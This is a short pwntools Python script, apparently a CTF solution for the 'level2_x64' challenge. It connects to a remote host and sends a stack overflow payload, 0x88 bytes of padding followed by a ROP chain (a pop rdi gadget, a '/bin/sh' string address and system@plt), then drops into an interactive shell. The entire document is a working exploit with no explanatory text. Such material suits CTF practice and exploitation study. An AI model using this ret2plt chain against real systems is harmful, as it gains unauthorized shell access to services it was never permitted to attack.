from pwn import *


p = remote("node4.buuoj.cn", 25884)
pro = ELF("./level2_x64")

system = pro.plt["system"]
binsh = next(pro.search(b"/bin/sh\x00"))
pop_rdi_ret = 0x00000000004006b3

pad = cyclic(0x80+0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.send(pad)

p.interactive()


